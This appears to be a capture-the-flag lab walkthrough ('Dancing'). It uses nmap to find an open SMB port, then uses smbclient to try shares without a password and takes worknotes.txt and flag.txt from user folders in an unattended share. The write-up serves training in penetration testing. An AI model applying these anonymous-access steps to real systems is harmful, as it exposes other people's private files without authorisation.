<h1>Dancing Lab</h1>

Step1: Spawn the target machine to acquire the target IP

Step2: Enumerate to find open ports > nmap -sV "targetIP"
<img width="1191" height="544" alt="image" src="https://github.com/user-attachments/assets/d62e147d-68c6-4358-9665-cec19ef02676" />

<h2> Port 445 is OPEN!!!!</h2>

Step 3: Install smbclient to access content> sudo apt-get install smbclient
<img width="1161" height="727" alt="image" src="https://github.com/user-attachments/assets/4b194a43-cdc0-4ccb-924c-b17c53a5b292" />

Step 4: Use --help command to see a list of available commands > smbclient --help
<img width="1400" height="915" alt="image" src="https://github.com/user-attachments/assets/c336e2a9-d608-4440-a20a-51a42754b145" />

Step 5: List the avialable shares > smbclient -L "target IP " 

<img width="1360" height="455" alt="image" src="https://github.com/user-attachments/assets/78e5dd8c-cd11-4d75-a5ce-55b4c7d9de56" />

Step 6: Trying to connect to available shares

Since we do not have any  credentials we try to connect to a share which is probably left unattended by mistake thus we won't insert a password

Fisrt attempt > smbclient \\\\"target ip"\\ADMIN$
<img width="814" height="179" alt="image" src="https://github.com/user-attachments/assets/c9d63c92-6ebc-445f-a88c-6c392883ab3f" />

No luck!!!!
Second attempt > smbclient \\\\"target ip"\\C$

<img width="708" height="129" alt="image" src="https://github.com/user-attachments/assets/24fd0dc0-2ec3-493f-a15d-824c688d71e9" />
No luck!!!

Third attempt >smbclient \\\\"target ip"\\WorkShares

Success!!!

We are able to view the contents of this share!!!
Step 7 > See the available commands > help

<img width="1136" height="774" alt="image" src="https://github.com/user-attachments/assets/08555e4e-3fd2-400e-ab0b-51fa624768ee" />


There is the ls command and the cd command to navigate to folders.
Step 7> View the contents > ls

<img width="1130" height="269" alt="image" src="https://github.com/user-attachments/assets/13053d21-13ab-4900-9c56-640813f834e2" />

Navigate to the folders and see their contents 
Folder : Amy.J has a file named worknotes.txt
We will acquire the file > get worknotes.txt

<img width="1130" height="269" alt="image" src="https://github.com/user-attachments/assets/c63f63d6-2566-48da-b445-38b7bec74cf2" />

Folder: James.P has a file named flag.txt
We will acquire the file > get flag.txt

<img width="1555" height="94" alt="image" src="https://github.com/user-attachments/assets/a0e7c431-05ba-40d5-93fd-d3b8c591600f" />

Step 8: We will exit the interactie console of smb > exit

Step 9: See the contents of the files we acquired >cat "file.name"












